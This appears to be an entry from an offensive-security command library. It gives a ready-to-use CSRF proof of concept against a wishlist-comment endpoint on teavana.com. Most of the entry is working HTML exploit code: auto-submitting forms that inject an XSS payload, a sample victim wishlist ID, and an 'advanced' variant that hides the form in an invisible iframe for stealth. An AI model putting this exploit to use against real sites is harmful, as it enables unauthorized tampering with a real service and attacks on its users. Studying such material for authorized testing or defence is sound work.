---
id: 123e4567-e89b-12d3-a456-426614174008
name: csrf-poc-form-for-xss
type: command
executor: html
data: >-
  <html><body><form
  action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id"
  method="POST"><input type="hidden" name="wishlistComment"
  value="&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;"/><input
  type="submit" value="Submit
  request"/></form><script>document.forms[0].submit();</script></body></html>
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.913Z'
platforms:
  - Web
tags:
  - csrf
  - poc
  - form-injection
verified: false
validated: true
submitted: true
---

# csrf-poc-form-for-xss

## Command

```html
<html><body><form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id" method="POST"><input type="hidden" name="wishlistComment" value="&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;"/><input type="submit" value="Submit request"/></form><script>document.forms[0].submit();</script></body></html>
```

## Description

Generates an HTML form for CSRF exploitation, auto-submitting an encoded XSS payload to the teavana.com wishlist endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `:id` | Victim's wishlist ID in action URL | Yes |
| `wishlistComment` | URL-encoded XSS payload | Yes |

## Examples

### Basic Usage

Save the HTML to a file and open in browser:

```html
<html><body><form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1005285074" method="POST"><input type="hidden" name="wishlistComment" value="&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;"/><input type="submit" value="Submit request"/></form><script>document.forms[0].submit();</script></body></html>
```

### Advanced Usage

Add iframe for stealth:

```html
<iframe style="display:none" src="data:text/html,<form action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1005285074\" method=\"POST\"><input type=\"hidden\" name=\"wishlistComment\" value=\"&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;\"/><input type=\"submit\"></form><script>document.forms[0].submit();</script>"></iframe>
```

## Expected Output

Auto-submission of POST request, adding the malicious comment; no visible UI change, but network tab shows request.

## Related

- [[commands/post-xss-payload-to-wishlist]]
- [[procedures/Craft-CSRF-POC-for-XSS-Exploitation]]
